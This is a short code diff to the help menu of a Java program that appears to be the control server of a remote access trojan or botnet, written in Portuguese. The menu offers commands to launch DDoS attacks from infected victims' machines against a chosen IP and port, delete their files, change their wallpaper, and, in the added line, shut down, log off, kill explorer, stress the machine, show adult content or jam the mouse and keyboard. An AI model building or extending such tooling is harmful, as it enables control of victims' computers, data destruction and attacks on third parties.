@@ -26,6 +26,7 @@ public class ServerCommandHelp extends ServerCommand {
         msg("fps (fps) | Selecionar a quantidade de FPS por padrão");
         msg("ping | Verificar o ping com o cliente");
         msg("ddos (ip) (porta) (tempo em segundos) (tamanho) | Enviar um ataque ddos do cliente para alguma interface");
+        msg("functions (shutdown/restart/logoff/mkdirs/desktop/killexplorer/explorer/stress/adult/rickroll/beep/mousebug/keyboardbug) | Funções aleatórias para fazer com o cliente");
         msg("wallpaper (arquivo) | Definir o wallpaper do usuário");
         msg("ls | Listar os arquivos na pasta atual");
         msg("del (arquivo/pasta) | Apagar um arquivo");
